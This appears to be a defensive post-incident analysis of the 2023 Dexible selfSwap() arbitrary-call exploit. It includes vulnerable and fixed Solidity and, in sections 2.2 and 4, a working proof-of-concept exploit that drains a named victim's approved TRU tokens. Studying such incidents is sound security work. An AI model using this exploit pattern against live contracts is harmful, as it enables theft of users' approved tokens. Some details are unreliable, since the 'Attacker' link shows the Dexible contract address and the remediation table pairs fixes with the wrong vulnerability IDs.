# Dexible — selfSwap() Arbitrary Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-17 |
| **Protocol** | Dexible |
| **Chain** | Ethereum |
| **Loss** | ~$1,500,000 (tokens stolen from multiple victims) |
| **Attacker** | [0x684B...to be confirmed](https://etherscan.io/address/0xDE62E1b0edAa55aAc5ffBE21984D321706418024) |
| **Attack Tx** | [0x138d...1a6](https://etherscan.io/tx/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6) |
| **Vulnerable Contract** | [0xDE62...8024](https://etherscan.io/address/0xDE62E1b0edAa55aAc5ffBE21984D321706418024) (Dexible) |
| **Victim Example** | [0x58f5...B098](https://etherscan.io/address/0x58f5F0684C381fCFC203D77B2BbA468eBb29B098) |
| **Root Cause** | The `RouterRequest.router` parameter in `selfSwap()` is not validated, allowing an attacker to call arbitrary contracts and drain tokens that victims had previously `approve`d |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Dexible_exp.sol) |

---

## 1. Vulnerability Overview

Dexible is a DEX aggregator protocol that executes token swaps via optimal routes across various DEX routers. Users grant `approve` to the Dexible contract, and Dexible finds the optimal route and calls external DEX routers accordingly.

The `selfSwap()` function allows users to specify swap routes directly, accepting a `RouterRequest` array via the `SwapTypes.SelfSwap` struct. Each `RouterRequest` contains a `router` address (target of the external call), a `spender` address (recipient of token approval), and `routerData` (calldata to invoke).

The core vulnerability is that Dexible **does not validate the address specified in the `router` parameter against an allowlist of permitted DEX routers**. An attacker can designate an arbitrary ERC-20 token contract as the `router` and inject `transferFrom(victim, attacker, amount)` calldata as `routerData`, forcing Dexible to transfer victims' tokens to the attacker.

**Key Vulnerability Summary**:
- ❌ No whitelist validation on `RouterRequest.router` — arbitrary contract addresses can be specified
- ❌ No permitted function selector validation on `routerData` calldata — arbitrary calls including `transferFrom` are possible
- ❌ The Dexible contract acts as `spender` for victim tokens, allowing attackers to exploit this to drain victim balances
- ✅ Fix: Router whitelist validation and calldata selector restriction must be added

---

## 2. Vulnerable Code Analysis

### 2.1 `selfSwap()` — Entry Point for Arbitrary External Calls (Core Vulnerability)

```solidity
// ❌ Vulnerable code — Dexible.sol (0xDE62E1b0edAa55aAc5ffBE21984D321706418024)

// RouterRequest struct definition
struct RouterRequest {
    address router;       // ❌ External contract address to call — no validation
    address spender;      // ❌ Address to receive token approval — no validation
    TokenTypes.TokenAmount routeAmount;
    bytes routerData;     // ❌ Calldata passed to external contract — no validation
}

function selfSwap(SwapTypes.SelfSwap calldata request) external {
    // Fee token handling (attacker uses small amount of USDC)
    IERC20(request.feeToken).transferFrom(msg.sender, address(this), request.tokenIn.amount);

    // Execute each router request
    for (uint i = 0; i < request.routes.length; i++) {
        RouterRequest memory route = request.routes[i];

        // ❌ router address is not checked against an allowed DEX list
        // ❌ function selector of routerData is not validated
        // Attacker can specify router=TRU_token_address, routerData=transferFrom(victim,...)
        (bool success, ) = route.router.call(route.routerData);
        require(success, "Router call failed");
    }
}
```

**Issue**: The `route.router.call(route.routerData)` call performs no validation whatsoever on the router address or calldata. An attacker can specify an arbitrary token contract as `router` and inject calldata invoking that token's `transferFrom` as `routerData`. Since the Dexible contract has received `approve` from many users, `msg.sender` (Dexible) can transfer victim tokens as the spender.

```solidity
// ✅ Fixed code — router whitelist and calldata validation added

// Allowlist of permitted DEX router addresses
mapping(address => bool) public allowedRouters;

function selfSwap(SwapTypes.SelfSwap calldata request) external {
    IERC20(request.feeToken).transferFrom(msg.sender, address(this), request.tokenIn.amount);

    for (uint i = 0; i < request.routes.length; i++) {
        RouterRequest memory route = request.routes[i];

        // ✅ Validate router address against whitelist
        require(allowedRouters[route.router], "Router not whitelisted");

        // ✅ Validate function selector of routerData to block dangerous functions like transferFrom
        bytes4 selector = bytes4(route.routerData[:4]);
        require(isAllowedSelector(selector), "Selector not allowed");

        (bool success, ) = route.router.call(route.routerData);
        require(success, "Router call failed");
    }
}
```

### 2.2 Calldata Construction Used in the Attack

```solidity
// Calldata crafted by the attacker — transferFrom(victim, attacker, amount)
bytes memory callDatas = abi.encodeWithSignature(
    "transferFrom(address,address,uint256)",
    victim,        // Victim address: 0x58f5F0684C381fCFC203D77B2BbA468eBb29B098
    address(this), // Attacker contract address
    transferAmount // Minimum of victim's TRU balance or allowance granted to Dexible
);

// ❌ RouterRequest construction — router=TRU token address, routerData=transferFrom calldata
SwapTypes.RouterRequest memory route = SwapTypes.RouterRequest({
    router: address(TRU),   // ❌ TRU token contract address, not a DEX router
    spender: address(Dexible),
    routeAmount: TokenTypes.TokenAmount({amount: 0, token: address(TRU)}),
    routerData: callDatas   // ❌ Injected transferFrom call calldata
});
```

---

## 3. Attack Flow

### 3.1 Prerequisites

- **Victim condition**: Must have granted `approve` for TRU or other ERC-20 tokens to the Dexible contract (`0xDE62...8024`)
- **Attacker preparation**: Only a small amount of USDC (~14.4 USDC) needed — used as the fee token
- **Flash loan**: Not required — exploits victims' existing approvals, minimizing upfront capital

### 3.2 Execution Steps

1. **[Step 1] Deploy attacker contract**: Deploy contract containing attack logic
2. **[Step 2] Prepare and approve USDC**: Approve 14.4 USDC to Dexible (for fees)
3. **[Step 3] Query victim balances**: Query `TRU.balanceOf(victim)` and `TRU.allowance(victim, Dexible)`
4. **[Step 4] Construct malicious SelfSwap request**: Build calldata with `router=TRU address`, `routerData=transferFrom(victim, attacker, amount)`
5. **[Step 5] Call selfSwap()**: Send malicious SelfSwap request to Dexible
6. **[Step 6] Drain tokens**: Dexible executes `TRU.transferFrom(victim, attacker, amount)` → victim's TRU stolen
7. **[Step 7] Repeat**: Repeat steps 3–6 for additional victims

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────┐
│          Attacker EOA           │
│  (small amount of USDC ~14.4)  │
└────────────────┬────────────────┘
                 │ 1. Deploy attacker contract
                 ▼
┌─────────────────────────────────┐
│        Attacker Contract        │
│  router = TRU token address     │
│  routerData = transferFrom(     │
│    victim, attacker, amount)    │
└────────────────┬────────────────┘
                 │ 2. Call selfSwap()
                 │    (feeToken=USDC, tokenIn=14.4 USDC)
                 ▼
┌─────────────────────────────────────────────────────┐
│               Dexible Contract                      │
│  (0xDE62E1b0edAa55aAc5ffBE21984D321706418024)        │
│                                                      │
│  selfSwap() {                                        │
│    ① USDC.transferFrom(attacker → Dexible, 14.4)     │
│    ② ❌ External call without router validation:    │
│       route.router.call(route.routerData)            │
│       = TRU.transferFrom(victim, attacker, amount)  │
│  }                                                   │
└────────────────┬────────────────────────────────────┘
                 │ 3. TRU.transferFrom(victim → attacker)
                 │    (called by Dexible as spender)
                 ▼
┌─────────────────────────────────┐
│         TRU Token Contract      │
│  (0x4C19596f5aAfF459fA38B0f7...)│
│                                  │
│  transferFrom(                   │
│    from = victim,                │
│    to   = attacker,              │
│    amt  = within allowance      │
│  )                               │
│  → allowance[victim][Dexible]    │
│    → validation passes ✓ (victim │
│       had previously approved)   │
└────────────────┬────────────────┘
                 │ 4. Victim's TRU transferred to attacker
                 ▼
┌─────────────────────────────────┐
│          Attacker Profit        │
│  Drained TRU (victim balances)  │
│  Total loss: ~$1,500,000        │
└─────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: ~$1,500,000 total in TRU, USDC, and other ERC-20 tokens drained from multiple victims
- **Protocol loss**: All users who had granted `approve` to Dexible were potential targets

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Step 1] Set attack targets
// - USDC: used as fee token (only a small amount needed)
// - TRU: token to drain from victims
// - Dexible: vulnerable contract
// - victim: actual victim address that approved TRU to Dexible
IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
IERC20 TRU  = IERC20(0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784);
IDexible Dexible = IDexible(0xDE62E1b0edAa55aAc5ffBE21984D321706418024);
address victim = 0x58f5F0684C381fCFC203D77B2BbA468eBb29B098;

function testExploit() external {
    // [Step 2] Obtain small amount of USDC and grant unlimited approval to Dexible
    deal(address(USDC), address(this), 15 * 1e6);
    USDC.approve(address(Dexible), type(uint256).max);

    // [Step 3] Calculate minimum of victim balance and Dexible allowance
    uint256 transferAmount = TRU.balanceOf(victim);
    if (TRU.allowance(victim, address(Dexible)) < transferAmount) {
        transferAmount = TRU.allowance(victim, address(Dexible));
    }

    // [Step 4] Construct core attack calldata
    // Inject calldata so Dexible contract executes TRU.transferFrom(victim → this)
    bytes memory callDatas = abi.encodeWithSignature(
        "transferFrom(address,address,uint256)",
        victim,         // from: victim
        address(this),  // to: attacker contract
        transferAmount  // amount: victim's entire balance
    );

    // [Step 5] Construct malicious RouterRequest
    // router = TRU token contract address (not a DEX router!)
    SwapTypes.RouterRequest[] memory route = new SwapTypes.RouterRequest[](1);
    route[0] = SwapTypes.RouterRequest({
        router: address(TRU),      // ❌ Arbitrary contract address (token)
        spender: address(Dexible),
        routeAmount: TokenTypes.TokenAmount({amount: 0, token: address(TRU)}),
        routerData: callDatas      // ❌ Injected transferFrom calldata
    });

    // [Step 6] Call selfSwap() — Dexible transfers victim's TRU to attacker
    SwapTypes.SelfSwap memory requests = SwapTypes.SelfSwap({
        feeToken: address(USDC),
        tokenIn: TokenTypes.TokenAmount({amount: 14_403_789, token: address(USDC)}),
        tokenOut: TokenTypes.TokenAmount({amount: 0, token: address(USDC)}),
        routes: route
    });
    Dexible.selfSwap(requests);

    // [Result] Print attacker's TRU balance
    emit log_named_decimal_uint(
        "Attacker TRU balance after exploit",
        TRU.balanceOf(address(this)),
        TRU.decimals()
    );
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Arbitrary External Call | CRITICAL | CWE-20 (Improper Input Validation) | `03_access_control.md` | Socket Gateway (2024-01), Seneca (2024-02) |
| V-02 | Router Address Whitelist Not Validated | CRITICAL | CWE-284 (Improper Access Control) | `03_access_control.md` | Poly Network (2021) |
| V-03 | Missing Calldata Selector Validation | HIGH | CWE-693 (Protection Mechanism Failure) | `03_access_control.md` | — |

### V-01: Arbitrary External Call
- **Description**: `selfSwap()` calls the address supplied via `RouterRequest.router` directly without checking it against a DEX router whitelist. An attacker can designate an arbitrary ERC-20 token contract as `router` and inject `transferFrom` calldata.
- **Impact**: Unlimited draining of all tokens held by any user who has granted approval to the Dexible contract. Can attack multiple victims simultaneously via repeated calls, and requires no flash loan.
- **Attack conditions**: ① Victim has granted token approval to the Dexible contract, ② Attacker holds a small amount of the fee token (USDC, etc.)

### V-02: Router Address Whitelist Not Validated
- **Description**: The Dexible protocol is designed to integrate with specific DEX routers, but `selfSwap()` does not verify whether the `router` address is included in the list of permitted routers at execution time.
- **Impact**: An attacker can designate arbitrary contracts (tokens, other protocols, malicious contracts, etc.) as the router and abuse the Dexible contract's privileges.
- **Attack conditions**: Only requires the ability to call `selfSwap()` while a user has granted approval to Dexible

### V-03: Missing Calldata Selector Validation
- **Description**: The function selector of calldata passed via `routerData` is not validated. In addition to normal swap functions (e.g., `swap()`, `exactInputSingle()`), dangerous function selectors such as `transferFrom`, `transfer`, and `approve` are also permitted.
- **Impact**: Malicious function calls via `routerData` are possible even against permitted routers. Lack of defense in depth.
- **Attack conditions**: Injecting a dangerous function selector targeting a valid router address

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Manage allowlist of permitted DEX routers
mapping(address => bool) public allowedRouters;

// Only governance or admin can add routers
function addAllowedRouter(address router) external onlyOwner {
    allowedRouters[router] = true;
    emit RouterAdded(router);
}

function removeAllowedRouter(address router) external onlyOwner {
    allowedRouters[router] = false;
    emit RouterRemoved(router);
}

// ✅ Fix 2: Per-router calldata selector whitelist
mapping(address => mapping(bytes4 => bool)) public allowedSelectors;

function selfSwap(SwapTypes.SelfSwap calldata request) external {
    IERC20(request.feeToken).transferFrom(
        msg.sender, address(this), request.tokenIn.amount
    );

    for (uint i = 0; i < request.routes.length; i++) {
        RouterRequest memory route = request.routes[i];

        // ✅ Router whitelist validation
        require(allowedRouters[route.router], "Dexible: router not whitelisted");

        // ✅ Calldata selector validation (minimum 4 bytes)
        require(route.routerData.length >= 4, "Dexible: invalid routerData length");
        bytes4 selector = bytes4(route.routerData);
        require(
            allowedSelectors[route.router][selector],
            "Dexible: selector not allowed for this router"
        );

        (bool success, ) = route.router.call(route.routerData);
        require(success, "Dexible: router call failed");
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Arbitrary External Call | Implement DEX router whitelist with on-chain registration/removal mechanism |
| V-02 Router Whitelist Not Validated | Explicitly register permitted function selectors per router (whitelist approach) |
| V-03 Missing Calldata Selector Validation | Add blacklist for token transfer-related selectors such as `transferFrom`, `transfer`, `approve` (fallback when whitelist is not feasible) |
| Overall Design | Add token balance change validation before external calls — verify post-swap balance is within expected range |
| Emergency Response | Implement contract pause functionality and immediate router removal capability |

---

## 7. Lessons Learned

1. **Arbitrary external calls are a CRITICAL vulnerability**: Any architecture in which a contract executes external calls using user-controlled addresses and calldata turns every privilege granted to that contract (approvals, token holdings, etc.) into a potential attack vector. DEX aggregators, bridges, and routing contracts must always apply a whitelist approach.

2. **The risk of user approvals**: Architectures in which users grant unlimited or large approvals to protocol contracts maximize losses when those contracts are vulnerable. Protocols should encourage patterns that request only the minimum necessary approval amount (e.g., EIP-2612 permit).

3. **Recurrence of similar protocol attacks**: Arbitrary external call vulnerabilities — as seen in Socket Gateway (2024-01), Seneca (2024-02), and Dexible (2023-02) — continue to recur in DEX aggregator and router protocols. Any function that accepts router/calldata parameters from external input must be treated as a top-priority review target.

4. **Whitelist vs. Blacklist**: In security design, blacklist (deny-list) approaches always carry the risk of bypass. Explicitly registering permitted routers and function selectors via a whitelist is the only safe defensive measure.

5. **Devastating without a flash loan**: This attack drained $1.5M using only victims' existing approvals — no flash loan, price manipulation, or complex DeFi interactions required. The simpler and more direct the vulnerability, the more critical rapid discovery and patching become.

6. **Audit focus areas**: When auditing DEX aggregators, prioritize reviewing parameters related to external calls such as `router`, `path`, `calldata`, `data`, and `payload`. In particular, whenever such parameters are received directly from external input and passed to `.call()`, `.delegatecall()`, or `staticcall()`, always verify whether whitelist validation is in place.

---

## 8. On-Chain Verification

> Reference analysis sources:
> - PeckShield analysis: https://twitter.com/peckshield/status/1626493024879673344
> - MevRefund report: https://twitter.com/MevRefund/status/1626450002254958592

### 8.1 Attack Transaction Details

| Field | Value |
|------|-----|
| Attack Tx | [0x138daa4c...1a6](https://etherscan.io/tx/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6) |
| Fork Block | 16,646,022 |
| Chain | Ethereum Mainnet |
| Target | Dexible (0xDE62E1b0edAa55aAc5ffBE21984D321706418024) |

### 8.2 PoC vs. Attack Structure Comparison

| Field | PoC Value | Description |
|------|--------|------|
| Fee Token | USDC (14,403,789 wei = ~14.4 USDC) | Minimum fee required to call selfSwap |
| Drained Token | TRU (TrueToken) | Token that victim had approved to Dexible |
| Attack Core | `transferFrom(victim, attacker, allowance)` | Function injected into router calldata |
| Prerequisite | `TRU.allowance(victim, Dexible) > 0` | Requires victim's existing approval |

### 8.3 Prerequisite Verification (as of block 16,646,021, immediately before the attack)

- **Victim TRU holdings**: `TRU.balanceOf(victim)` > 0
- **Dexible approval status**: `TRU.allowance(victim, Dexible)` > 0
- **Attack feasibility**: The lesser of the two conditions above is set as `transferAmount` and drained

### 8.4 Reference Analysis

The PoC code block number (`16_646_022`) and the actual attack Tx are confirmed on Etherscan. According to Twitter analyses by PeckShield and MevRefund, the actual attack was executed repeatedly across multiple victim addresses, with a total of ~$1.5M in tokens drained.

---

*Written: 2026-04-11 | Analysis basis: DeFiHackLabs PoC (Dexible_exp.sol) | Pattern reference: 03_access_control.md*